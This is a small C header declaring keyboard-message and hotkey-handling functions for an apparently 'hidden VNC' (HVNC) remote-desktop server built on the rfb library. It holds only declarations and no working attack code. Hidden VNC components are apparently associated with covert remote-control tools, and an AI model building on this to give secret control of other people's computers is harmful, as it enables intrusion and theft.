#ifndef KBD_H_INCLUDED
#define KBD_H_INCLUDED

#define XK_MISCELLANY
#define XK_LATIN1
#include "rfb\keysym.h"

void ProcessKbdMsg(rfbClientPtr cl,DWORD dwKeySym,rfbBool bDown);
WORD UpdateInputState(PHVNC lpServer,byte bVK,rfbBool bDown);
void ExecuteKeySym(rfbClientPtr cl,HWND hWnd,DWORD dwKeySym,rfbBool bDown);

extern HKL hklLocales[40];
extern int dwLocalesNum;

struct HK_THREAD
{
    HVNC hVNC;
    HOTKEYINFO *lpHotKey;
};

#endif // KBD_H_INCLUDED
